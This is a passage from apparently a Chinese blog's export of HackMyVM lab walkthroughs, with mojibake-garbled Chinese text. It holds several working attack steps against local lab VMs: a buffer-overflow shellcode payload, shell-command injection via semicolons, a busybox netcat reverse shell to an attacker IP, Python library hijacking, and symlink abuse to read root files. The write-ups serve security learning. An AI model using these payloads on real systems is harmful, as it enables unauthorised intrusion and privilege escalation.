seconds\n~~~\n\n# 80ç«¯å£\n\næ‰«æç›®å½•\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# gobuster dir -u \"http://192.168.31.159/\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-m\nedium.txt -x .php,.txt,.jpg\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.31.159/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,jpg\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/images               (Status: 301) [Size: 317] [--> http://192.168.31.159/images/]\n/.php                 (Status: 403) [Size: 279]\n/index.php            (Status: 200) [Size: 5656]\n/docs                 (Status: 301) [Size: 315] [--> http://192.168.31.159/docs/]\n/page                 (Status: 301) [Size: 315] [--> http://192.168.31.159/page/]\n/header.php           (Status: 200) [Size: 13]\n/admin                (Status: 301) [Size: 316] [--> http://192.168.31.159/admin/]\n/footer.php           (Status: 500) [Size: 614]\n/license              (Status: 301) [Size: 318] [--> http://192.168.31.159/license/]\n/README.txt           (Status: 200) [Size: 975]\n/js                   (Status: 301) [Size: 313] [--> http://192.168.31.159/js/]\n/include              (Status: 301) [Size: 318] [--> http://192.168.31.159/include/]\n/backup               (Status: 301) [Size: 317] [--> http://192.168.31.159/backup/]\n/styles               (Status: 301) [Size: 317] [--> http://192.168.31.159/styles/]\n/INSTALL.txt          (Status: 200) [Size: 1201]\n/.php                 (Status: 403) [Size: 279]\n/wysiwyg              (Status: 301) [Size: 318] [--> http://192.168.31.159/wysiwyg/]\n/server-status        (Status: 403) [Size: 279]\n/mails                (Status: 301) [Size: 316] [--> http://192.168.31.159/mails/]\n~~~\n\nä»/README.txt å¾—çŸ¥æ˜¯ApPHPçš„æ¡†æ¶ï¼Œmailsé‡Œæœ‰è´¦å·å’Œå¯†ç ï¼Œå…¶ä»–çš„éƒ½æ²¡ä»€ä¹ˆç”¨\n\n~~~\nHello _USER_NAME_!<br> <br>\n\nYou or someone else asked for your login info on our site, _WEB_SITE_\n\nYour Login Info:\n------------------------<br/>\nUsername: _USER_NAME_\nPassword: _USER_PASSWORD_\n\n------------------<br/>\nBest regards,\n_WEB_SITE_\n~~~\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# searchsploit apphp\n-------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                        |  Path\n-------------------------------------------------------------------------------------- ---------------------------------\nApPHP MicroBlog 1.0.1 - Multiple Vulnerabilities                                      | php/webapps/33030.txt\nApPHP MicroBlog 1.0.1 - Remote Command Execution                                      | php/webapps/33070.py\nApPHP MicroBlog 1.0.2 - Cross-Site Request Forgery (Add New Author)                   | php/webapps/40506.html\nApPHP MicroBlog 1.0.2 - Persistent Cross-Site Scripting                               | php/webapps/40505.txt\nApPHP MicroCMS 3.9.5 - Cross-Site Request Forgery (Add Admin)                         | php/webapps/40517.html\nApPHP MicroCMS 3.9.5 - Persistent Cross-Site Scripting                                | php/webapps/40516.txt\n-------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\nPapers: No Results\n~~~\n\nphp/webapps/33070.pyè·‘è¿™ä¸ªè„šæœ¬å°±è¡Œï¼Œç„¶åå¼¹å‡ºæ¥ä¸€ä¸ªshell\n\n# ææƒ\n\nåœ¨/var/www/html/include/base.inc.phpé‡Œæœ‰ç”¨æˆ·åå’Œå¯†ç \n\n~~~\nwww-data@debian:/var/www/html/include$ cat base.inc.php\n<?php\n                        // DATABASE CONNECTION INFORMATION\n                        define('DATABASE_HOST', 'localhost');           // Database host\n                        define('DATABASE_NAME', 'microblog');           // Name of the database to be used\n                        define('DATABASE_USERNAME', 'clapton'); // User name for access to database\n                        define('DATABASE_PASSWORD', 'yaraklitepe');     // Password for access to database\n                        define('DB_ENCRYPT_KEY', 'p52plaiqb8');         // Database encryption key\n                        define('DB_PREFIX', 'mb101_');              // Unique prefix of all table names in the database\n                        ?>\n~~~\n\nsu clapton\n\n# ææƒroot\n\nhomeç›®å½•ä¸‹æœ‰inputä¸€ä¸ªç¨‹åºå’Œä¸€ä¸ªnote\n\n~~~\nclapton@debian:~$ cat note.txt\nbuffer overflow is the way. ( Í¡Â° ÍœÊ– Í¡Â°)\n\nif you're new on 32bit bof then check these:\n\nhttps://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html\nhttps://samsclass.info/127/proj/lbuf1.htm\n~~~\n\ninputçš„ä¼ªcä»£ç \n\n~~~\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char dest[159]; // [esp+11h] [ebp-9Fh] BYREF\n\n  if ( argc <= 1 )\n  {\n    printf(\"Syntax: %s <input string>\\n\", *argv);\n    exit(0);\n  }\n  strcpy(dest, argv[1]);\n  return 0;\n}\n~~~\n\näºŒè¿›åˆ¶æˆ‘å±å®ä¸ä¼šï¼Œçœ‹å¤§ä½¬wpäº†\n\npayloadï¼š\n\n~~~\nfor i in {1..10000}; do (./input $(python -c 'print(\"A\" * 171 + \"\\xa0\\xe7\\x84\\xbf\" + \"\\x90\" * 1000 + \"\\x31\\xc9\\xf7\\xe1\\x51\\xbf\\xd0\\xd0\\x8c\\x97\\xbe\\xd0\\x9d\\x96\\x91\\xf7\\xd7\\xf7\\xd6\\x57\\x56\\x89\\xe3\\xb0\\x0b\\xcd\\x80\")')) ; done\n~~~\n\n","tags":["é¶æœº"],"categories":["HackMyVM"]},{"title":"HackmyVM-WMessage","url":"/2025/04/24/HackmyVM-WMessage/","content":"\n\n\n\n\n# ä¿¡æ¯æœé›†\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:77:9d:8a       PCS Systemtechnik GmbH\n192.168.31.158  08:00:27:06:63:ee       PCS Systemtechnik GmbH\n~~~\n\n192.168.31.158å°±æ˜¯é¶æœºipåœ°å€\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# nmap 192.168.31.158 -p-\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-04-24 01:26 EDT\nNmap scan report for 192.168.31.158\nHost is up (0.00070s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:06:63:EE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 13.31 seconds\n~~~\n\n# 80ç«¯å£\n\nå…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œæ˜¯ä¸€ä¸ªç•™è¨€æ¿ï¼Œè¾“å…¥`!mpstat`å¯ä»¥æŸ¥çœ‹cupçš„çŠ¶æ€ï¼Œä½†æ˜¯è¾“å…¥å…¶ä»–å‘½ä»¤ä¸è¡Œï¼ŒçŒœæµ‹åªèƒ½è¿è¡Œmpstatå‘½ä»¤ç”¨åˆ†å·æ‹¼æ¥ä¸€ä¸‹å‘½ä»¤å‘ç°å¯ä»¥æ‰§è¡ŒæˆåŠŸ\n\n~~~\n!mpstat;id\nServer: Linux 5.10.0-19-amd64 (MSG) 04/24/25 _x86_64_ (1 CPU) 05:30:02 CPU %usr %nice %sys %iowait %irq %soft %steal %guest %gnice %idle 05:30:02 all 1.84 0.01 0.57 0.13 0.00 0.27 0.00 0.00 0.00 97.19 uid=33(www-data) gid=33(www-data) groups=33(www-data)\n~~~\n\nåå¼¹ä¸€ä¸ªshell\n\n# ææƒ\n\nsudo -l\n\n~~~\nwww-data@MSG:~$ sudo -l\nMatching Defaults entries for www-data on MSG:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser www-data may run the following commands on MSG:\n    (messagemaster) NOPASSWD: /bin/pidstat\n~~~\n\npidstatæœ‰ä¸€ä¸ª-eå‚æ•°å¯ä»¥ç›‘æ§æ‰§è¡Œçš„å‘½ä»¤\n\n~~~\n sudo -u messagemaster /bin/pidstat -e bash\n~~~\n\næ‰§è¡Œbashä¼šè‡ªåŠ¨é€€å‡ºï¼Œé‚£å°±å†™ä¸€ä¸ªå…¬é’¥è¿›å»ï¼Œhomeç›®å½•ä¸‹æ²¡æœ‰.sshå…ˆåˆ›å»ºä¸€ä¸ª.sshæ–‡ä»¶å¤¹ï¼Œç„¶åcpè¿›å»ä¸€ä¸ªauthorized_keys\n\nsshç™»å½•\n\n# ææƒroot\n\n~~~\nmessagemaster@MSG:~$ sudo -l\nMatching Defaults entries for messagemaster on MSG:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser messagemaster may run the following commands on MSG:\n    (ALL) NOPASSWD: /bin/md5sum\n~~~\n\nå¯ä»¥æ‰§è¡Œmd5sumï¼Œåœ¨/var/www/æ–‡ä»¶å¤¹ä¸‹è¿˜æœ‰ä¸€ä¸ªROOTPASS,å¯ä»¥å°†rootçš„å¯†ç è¿›è¡Œmd5åŠ å¯†\n\n~~~\nmessagemaster@MSG:/var/www$ ls -ll\ntotal 8\ndrwxrwxr-- 5 www-data www-data 4096 Nov 18  2022 html\n-rw-r----- 1 root     root       12 Nov 21  2022 ROOTPASS\n~~~\n\nROOTPASSçš„å­—èŠ‚æ˜¯12ï¼Œè¯´æ˜ROOTçš„å¯†ç æ˜¯11ä½çš„å› ä¸ºæœ€åè¿˜æœ‰ä¸€ä¸ªæ¢è¡Œç¬¦ï¼Œå¯ä»¥å…ˆå°†rockyou.txté‡Œ11ä½çš„å¯†ç å…ˆå–å‡ºæ¥\n\n~~~\ngrep -E \"^.{11}$\" /usr/share/wordlists/rockyou.txt >pass.txt\n~~~\n\nç„¶åå¯¹æ¯è¡Œè¿›è¡Œmd5åŠ å¯†\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# for i in $(cat pass.txt);do echo $i|md5sum>>md5.txt ;done ï¼ˆæœ‰ç‚¹æ…¢ï¼‰\n~~~\n\nå†ç”¨pasteå°†rockyou.txtå’Œè¿™ä¸ªåˆå¹¶\n\n~~~\npaste -d ':' md5.txt /usr/share/wordlists/rockyou.txt >pass.txt\n~~~\n\næœ€ågrepä¸€ä¸‹\n\n~~~\ngrep \"85c73111b30f9ede8504bb4a4b682f48\" pass.txt\n~~~\n\nå¯ä»¥å¾—åˆ°rootçš„å¯†ç æ˜¯`Message5687`\n","tags":["é¶æœº"],"categories":["HackMyVM"]},{"title":"HackmyVM-Vinylizer","url":"/2025/04/23/HackmyVM-Vinylizer/","content":"\n\n\n# ä¿¡æ¯æœé›†\n\narp-scan -l\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:8d:42:52       PCS Systemtechnik GmbH\n192.168.31.156  08:00:27:6d:ec:17       PCS Systemtechnik GmbH\n~~~\n\n192.168.31.156 å°±æ˜¯é¶æœºåœ°å€\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# nmap 192.168.31.156 -p-\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-04-23 06:00 EDT\nNmap scan report for 192.168.31.156\nHost is up (0.0025s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:6D:EC:17 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 14.73 seconds\n~~~\n\n# 80ç«¯å£\n\næ‰«æç›®å½•åªæœ‰ä¸€ä¸ªç™»å½•çš„login.phpä¸æ˜¯å¼±å£ä»¤ï¼Œå°è¯•sqlæ³¨å…¥\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# sqlmap -u \"http://192.168.31.156/login.php\" --forms\n        ___\n       __H__\n ___ ___[\"]_____ ___ ___  {1.8.11#stable}\n|_ -| . [(]     | .'| . |\n|___|_  [)]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 06:04:37 /2025-04-23/\n\n[06:04:37] [INFO] testing connection to the target URL\nyou have not declared cookie(s), while server wants to set its own ('PHPSESSID=0om6k37fejc...nqdkc3ihnt'). Do you want to use those [Y/n]\n\n[06:04:38] [INFO] searching for forms\n[1/1] Form:\nPOST http://192.168.31.156/login.php\nPOST data: username=&password=&login=\ndo you want to test this form? [Y/n/q]\n>\n\nEdit POST data [default: username=&password=&login=] (Warning: blank fields detected):\n\ndo you want to fill blank fields with random values? [Y/n]\n\n[06:04:38] [INFO] resuming back-end DBMS 'mysql'\n[06:04:38] [INFO] using '/root/.local/share/sqlmap/output/results-04232025_0604am.csv' as the CSV results file in multiple targets mode\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: username (POST)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: username=GcYl' AND (SELECT 7194 FROM (SELECT(SLEEP(5)))aupQ) AND 'jWGR'='jWGR&password=yoAl&login=bpLA\n---\ndo you want to exploit this SQL injection? [Y/n]\n\n[06:04:39] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu 22.04 (jammy)\nweb application technology: Apache 2.4.52\nback-end DBMS: MySQL >= 5.0.12\n[06:04:39] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-04232025_0604am.csv'\n\n[*] ending @ 06:04:39 /2025-04-23/\n~~~\n\nå­˜åœ¨æ—¶é—´ç›²æ³¨ï¼Œå¯ä»¥æ³¨å…¥å‡ºæ¥ç”¨æˆ·å’Œå¯†ç \n\n~~~\nTable: users\n[2 entries]\n+----+----------------------------------+-----------+----------------+\n| id | password                         | username  | login_attempts |\n+----+----------------------------------+-----------+----------------+\n| 1  | 9432522ed1a8fca612b11c3980a031f6 | shopadmin | 0              |\n| 2  | password123                      | lana      | 0              |\n+----+----------------------------------+-----------+----------------+\n~~~\n\nshopadminçš„å¯†ç è§£å¯†\n\n~~~\n9432522ed1a8fca612b11c3980a031f6:addicted2vinyl\n~~~\n\nç„¶åsshç™»å½•\n\n# ææƒ\n\nsudo -læŸ¥çœ‹\n\n~~~\nshopadmin@vinylizer:/usr/lib/python3$ sudo -l\nMatching Defaults entries for shopadmin on vinylizer:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n    use_pty\n\nUser shopadmin may run the following commands on vinylizer:\n    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/vinylizer.py\n~~~\n\n~~~\nshopadmin@vinylizer:/usr/lib/python3$ cat /opt/vinylizer.py\n# @Name: Vinylizer\n# @Author: MrMidnight\n# @Version: 1.8\n\nimport json\nimport random\n\ndef load_albums(filename):\n    try:\n        with open(filename, 'r') as file:\n            content = file.read()\n            if not content:\n                return []\n            albums = json.loads(content)\n    except FileNotFoundError:\n        albums = []\n    except json.JSONDecodeError:\n        print(f\"Error decoding JSON_Config: {filename}.\")\n        albums = []\n    return albums\n\n\ndef save_albums(filename, albums):\n    with open(filename, 'w') as file:\n        json.dump(albums, file, indent=None)\n\n\ndef print_albums(albums):\n    if not albums:\n        print(\"No albums available.\")\n    else:\n        print(\"Available Albums:\")\n        for album in albums:\n            print(f\"- {album['name']}, Sides: {', '.join(album['sides'])}\")\n\n\ndef randomize_sides(album):\n    sides = list(album['sides'])\n    random.shuffle(sides)\n    return {\"name\": album['name'], \"sides\": sides}\n\n\ndef randomize_vinyl(albums):\n    if not albums:\n        print(\"No albums available. Add one with 'A'.\")\n        return None, None\n\n    random_album = random.choice(albums)\n    random_side = random.choice(random_album['sides'])\n\n    return random_album['name'], random_side\n\n\ndef add_vinyl(albums, filename, name, num_sides):\n    # Generate sides from A to the specified number\n    sides = [chr(ord('A') + i) for i in range(num_sides)]\n\n    # Add new vinyl\n    new_album = {\"name\": name, \"sides\": sides}\n    albums.append(new_album)\n    save_albums(filename, albums)\n    print(f\"Album '{name}' with {num_sides} sides added successfully.\\n\")\n\n\ndef delete_vinyl(albums, filename, name):\n    for album in albums:\n        if album['name'] == name:\n            albums.remove(album)\n            save_albums(filename, albums)\n            print(f\"Album '{name}' deleted successfully!\\n\")\n            return\n    print(f\"Album '{name}' not found.\")\n\n\ndef list_all(albums):\n    print_albums(albums)\n\n\nif __name__ == \"__main__\":\n\n    # Banner. Dont touch!\n    print(\"o      'O                  o\\nO       o o               O  o\\no       O                 o\\no       o\n        O\\nO      O' O  'OoOo. O   o o  O  ooOO .oOo. `OoOo.\\n`o    o   o   o   O o   O O  o    o  OooO'  o\\n `o  O    O   O   o O   o o  O   O   O      O\\n  `o'     o'  o   O `OoOO Oo o' OooO `OoO'  o\\nBy: MrMidnight          o\\n\n           OoO'                         \\n\")\n\n    config_file = \"config.json\"\n\n    albums_config = load_albums(config_file)\n\n    while True:\n        choice = input(\"Do you want to (R)andomly choose a Album, (A)dd a new one, (D)elete an album, (L)ist all albums, or (Q)uit? : \").upper()\n\n        if choice == \"R\":\n            random_album, random_side = randomize_vinyl(albums_config)\n            if random_album is not None and random_side is not None:\n                print(f\"Randomly selected album: {random_album}, Random side: {random_side}\\n\")\n\n        elif choice == \"A\":\n            name = input(\"\\nEnter the name of the new album: \")\n\n            while True:\n                try:\n                    num_sides = int(input(\"Enter the number of sides for the new album: \"))\n                    break  # Break the loop if the input is a integer\n                except ValueError:\n                    print(\"\\nInvalid input. Please enter a valid integer for the number of sides.\")\n\n            add_vinyl(albums_config, config_file, name, num_sides)\n\n        elif choice == \"D\":\n            name = input(\"\\nEnter the name of the album to delete: \")\n            delete_vinyl(albums_config, config_file, name)\n\n        elif choice == \"L\":\n            list_all(albums_config)\n            print(\"\")\n\n        elif choice == \"Q\":\n            print(\"\\nQuitting Vinylizer.\")\n            break\n\n        else:\n            print(\"Invalid Input!\")\n~~~\n\nè¿™ä¸ªpythonæ–‡ä»¶æ²¡ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ï¼ŒæŸ¥æ‰¾æ˜¯å¦å­˜åœ¨åº“åŠ«æŒ\n\n~~~\nfind / -writable 2>/dev/null\n/usr/lib/python3.10/random.py #å¯å†™\n~~~\n\næ·»åŠ \n\n~~~\nimport os\nos.system(\"bash -p\")\n~~~\n\nç„¶åsudoè¿è¡Œ\n","tags":["é¶æœº"],"categories":["HackMyVM"]},{"title":"ç¾¤å‹æœº-Byxs20","url":"/2025/04/20/ç¾¤å‹é¶æœº-Byxs20/","content":"\n\n\n# ä¿¡æ¯æœé›†\n\narp-scan -l æ‰«æé¶æœºip\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:3d:c2:d3       PCS Systemtechnik GmbH\n192.168.31.149  08:00:27:9e:3d:15       PCS Systemtechnik GmbH\n\n3 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 2.406 seconds (106.40 hosts/sec). 3 responded\n~~~\n\nç„¶ånmapæ‰«æä¸€ä¸‹å¼€æ”¾ç«¯å£\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# nmap 192.168.31.149\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-04-20 06:02 EDT\nNmap scan report for 192.168.31.149\nHost is up (0.0018s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:9E:3D:15 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 6.85 seconds\n~~~\n\n# 80ç«¯å£\n\ngobusteræ‰«æä¸€ä¸‹ç›®å½•\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# gobuster dir -u \"192.168.31.149\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.tx\nt -x .php,.txt,.jpg\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.31.149\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,jpg\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.php                 (Status: 403) [Size: 279]\n/templates            (Status: 301) [Size: 320] [--> http://192.168.31.149/templates/]\n/template.php         (Status: 200) [Size: 258]\n/conf                 (Status: 301) [Size: 315] [--> http://192.168.31.149/conf/]\n/ping.php             (Status: 200) [Size: 11]\n~~~\n\n/template.phpæœ‰ä¸€ä¸ªè™šå‡çš„æ–‡ä»¶åŒ…å«ï¼ˆåé¢æ‹¿åˆ°shellä¹‹åæŸ¥çœ‹æ–‡ä»¶å¯ä»¥çŸ¥é“ï¼‰,ping.phpå¯ä»¥æ‰§è¡Œpingå‘½ä»¤ï¼Œfuzzä¸€ä¸‹å‚æ•°\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# arjun -u \"http://192.168.31.149/ping.php\"\n    _\n   /_| _ '\n  (  |/ /(//) v2.2.7\n      _/\n\n[*] Scanning 0/1: http://192.168.31.149/ping.php\n[*] Probing the target for stability\n[*] Analysing HTTP response for anomalies\n[*] Logicforcing the URL endpoint\n[âœ“] parameter detected: debug, based on: http headers\n[+] Parameters found: debug\n~~~\n\næ‰¾åˆ°ä¸€ä¸ªdebugå‚æ•°ï¼ˆå…¶å®ä¸€å¼€å§‹æ˜¯æƒ³fuzzå‡ºäº†æ‹¼æ¥ipçš„å‚æ•°çš„ï¼Œè¯¯æ‰“è¯¯æ’ï¼‰ï¼Œipçš„å‚æ•°å°±æ˜¯ip\n\n~~~\nhttp://192.168.31.149/ping.php?debug&ip=;ls\n~~~\n\nå¯ä»¥æ‹¼æ¥æ‰§è¡Œå‘½ä»¤\n\n~~~\n#ping.php\n<?php\n// diag.php - è¡¨é¢ä¸¥æ ¼æ ¡éªŒï¼Œå®é™…æš—è—è°ƒè¯•åé—¨\n$ip = $_GET['ip'] ?? '';\n\n// æš—æ¡©è§¦å‘æ¡ä»¶ï¼šåªè¦æºå¸¦debugå‚æ•°\nif(isset($_GET['debug'])){\n    // å…³é—­é”™è¯¯æç¤ºé¿å…æš´éœ²è·¯å¾„\n    error_reporting(0);\n    \n    // è¾“å‡ºè¯¦ç»†ç³»ç»Ÿä¿¡æ¯ï¼ˆä¼ªè£…æˆè°ƒè¯•æ¨¡å¼ï¼‰\n    echo \"<pre>\";\n    echo \"[*] Debug Mode Activated\\n\";\n    echo \"[+] Raw Command: ping -c 3 \" . $ip . \"\\n\";\n    \n    // ç›´æ¥æ‹¼æ¥å‘½ä»¤æ‰§è¡Œï¼ˆæ— ä»»ä½•è¿‡æ»¤ï¼‰\n    system(\"ping -c 3 \" . $ip);\n    \n    // æ³„æ¼æ•æ„Ÿä¿¡æ¯\n    echo \"\\n\\n=== System Info ===\\n\";\n    echo \"PHP User: \" . shell_exec('whoami');\n    echo \"PHP Version: \" . phpversion() . \"\\n\";\n    echo \"Disable Functions: \" . ini_get('disable_functions') . \"\\n\";\n    echo \"</pre>\";\n    exit;\n}\n\n// ä¸»åŠŸèƒ½ï¼šä¸¥æ ¼IPv4æ­£åˆ™éªŒè¯ï¼ˆæ— æ‡ˆå¯å‡»ï¼‰\nif (!preg_match('/^(25[0-5]|2[0-4]\\d|1\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|1\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|1\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|1\\d{2}|[1-9]?\\d)$/', $ip)) {\n    die(\"Invalid IP!\");\n}\n\n// å®‰å…¨æ‰§è¡Œå‘½ä»¤ï¼ˆæ— æ³¨å…¥å¯èƒ½ï¼‰\n$cmd = ['ping', '-c', '3', $ip];\nsystem(escapeshellcmd(implode(' ', $cmd)));\n?>\n~~~\n\nç„¶åç”¨busyboxåå¼¹shell\n\n~~~\n;busybox%20nc%20192.168.31.129%204444%20-e%20/bin/bash\n~~~\n\næ‹¿åˆ°shellä¹‹åï¼ŒæŸ¥çœ‹sudo -l\n\n~~~\nwww-data@Byxs20:/tmp$ sudo -l\nMatching Defaults entries for www-data on Byxs20:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bi\nn\n\nUser www-data may run the following commands on Byxs20:\n    (ALL : ALL) NOPASSWD: /usr/sbin/reboot\n~~~\n\nå¯ä»¥æ‰§è¡Œreboot\n\nä¸Šä¼ ä¸€ä¸ªpspyç›‘æ§ä¸€ä¸‹è¿›ç¨‹\n\n~~~\nwww-data@Byxs20:/tmp$ busybox wget 192.168.31.129/pspy64\n~~~\n\nå¯ä»¥çœ‹åˆ°rootç”¨æˆ·å°†`/var/www/html/conf/apache2.conf.bak` å¤åˆ¶åˆ°äº†`/etc/apache2/apache2.conf`\n\n~~~\n2025/04/20 06:11:01 CMD: UID=0     PID=749    | /bin/sh -c cp /var/www/html/conf/apache2.conf.bak  /etc/apache2/apache2.conf\n~~~\n\napache2.conf.bakæ–‡ä»¶æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œåé¢ç»è¿‡ç¾¤ä¸»æé†’æˆ‘æ‰å¹¡ç„¶é†’æ‚Ÿï¼Œå¯ä»¥åšä¸€ä¸ªè½¯è¿æ¥å•Šï¼Œ`/etc/apache2/apache2.conf`æˆ‘ä»¬æ˜¯å¯è¯»çš„\n\n~~~\nwww-data@Byxs20:/var/www/html/conf$ ln -sf /home/welcome/user.txt apache2.conf.bak\nwww-data@Byxs20:/var/www/html/conf$ cat /etc/apache2/apache2.conf\nflag{user-05659dca555d4ddbc396b319645f3d2a}\nwww-data@Byxs20:/var/www/html/conf$ ln -sf /root/root.txt apache2.conf.bak\nwww-data@Byxs20:/var/www/html/conf$ cat /etc/apache2/apache2.conf\nflag{root-f9ef88715e3bbec612f9f88d64ae3a99}\n~~~\n\nå¦ä¸€ä¸ªæ€è·¯å°±æ˜¯ä¿®æ”¹`apache2.conf.bak`ï¼Œå°†webæœåŠ¡ä»¥welcomeçš„æƒé™è¿è¡Œï¼Œå°†apacke2.conf.baké‡Œé¢çš„Userå’ŒGroupä¿®æ”¹ä¸€ä¸‹\n\n~~~\nUser welcome\nGroup welcome\n~~~\n\nç„¶åä¸Šä¼ å†é‡å¯é¶æœºï¼Œç„¶åå†æ¬¡åå¼¹shellä¼šå‘ç°ç”¨æˆ·å˜æˆwelcomeäº†ï¼ˆè¿™é‡Œä¸èƒ½ä¿®æ”¹æˆrootï¼Œæ˜¯å› ä¸ºapache2é»˜è®¤ä¸å…è®¸rootå¯åŠ¨ï¼Œå¦‚æœè¦rootå¯åŠ¨ï¼Œéœ€è¦æ·»åŠ â€œ-DBIG_SECURITY_HOLEâ€åˆ°CFLAGSç¯å¢ƒå˜é‡ä¸­é‡æ–°ç¼–è¯‘ï¼‰\n\n~~~\nid\nuid=1000(welcome) gid=1000(welcome) groups=1000(welcome)\n~~~\n\næŸ¥çœ‹sudo -l\n\n~~~\nwelcome@Byxs20:/home/welcome$ sudo -l\nsudo -l\nMatching Defaults entries for welcome on Byxs20:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser welcome may run the following commands on Byxs20:\n    (ALL : ALL) NOPASSWD: /usr/sbin/reboot\n    (ALL : ALL) NOPASSWD: /home/welcome/test/test\n~~~\n\nå°±æ˜¯ç‹ç‚¸æ–¹æ¡ˆï¼Œå°†testç›®å½•æ¢ä¸€ä¸ªåå†æ–°åˆ›å»ºä¸€ä¸ªtest/test\n\n~~~\nwelcome@Byxs20:/home/welcome$ mv test 1\nmv test 